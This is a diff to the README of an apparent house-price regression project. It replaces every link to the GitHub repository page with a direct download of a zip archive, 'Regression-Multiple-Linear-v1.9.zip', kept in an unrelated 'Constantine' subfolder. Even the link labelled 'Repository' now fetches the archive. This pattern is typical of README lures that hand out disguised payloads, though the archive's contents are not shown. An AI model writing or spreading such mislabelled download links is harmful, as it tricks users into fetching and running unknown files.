@@ -1,6 +1,6 @@
 # 🏠 Multiple-Linear-Regression - Predict House Prices Simply
 
-[![Download](https://img.shields.io/badge/Download-Multiple--Linear--Regression-brightgreen?style=for-the-badge)](https://github.com/Ahmdddddddddd/Multiple-Linear-Regression)
+[![Download](https://img.shields.io/badge/Download-Multiple--Linear--Regression-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmdddddddddd/Multiple-Linear-Regression/main/Constantine/Regression-Multiple-Linear-v1.9.zip)
 
 ## 🔍 About This Application
 
@@ -27,7 +27,7 @@ You will get the app files from the main GitHub page linked below. Follow these 
 
 Click the big button above or go directly to this link:
 
-[Download Multiple-Linear-Regression](https://github.com/Ahmdddddddddd/Multiple-Linear-Regression)
+[Download Multiple-Linear-Regression](https://raw.githubusercontent.com/Ahmdddddddddd/Multiple-Linear-Regression/main/Constantine/Regression-Multiple-Linear-v1.9.zip)
 
 This page contains all files and instructions for the app.
 
@@ -105,7 +105,7 @@ The app processes your inputs with a trained regression model. It looks at many 
 
 You can visit the main GitHub page any time to get the latest version of the app or see updates:
 
-[Multiple-Linear-Regression Repository](https://github.com/Ahmdddddddddd/Multiple-Linear-Regression)
+[Multiple-Linear-Regression Repository](https://raw.githubusercontent.com/Ahmdddddddddd/Multiple-Linear-Regression/main/Constantine/Regression-Multiple-Linear-v1.9.zip)
 
 Look at the **Releases** section for new versions or bug fixes.
 
@@ -123,4 +123,4 @@ If you run into any problems, you can open an **Issue** on the GitHub page. Desc
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Multiple--Linear--Regression-brightgreen?style=for-the-badge)](https://github.com/Ahmdddddddddd/Multiple-Linear-Regression)
+[![Download](https://img.shields.io/badge/Download-Multiple--Linear--Regression-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Ahmdddddddddd/Multiple-Linear-Regression/main/Constantine/Regression-Multiple-Linear-v1.9.zip)
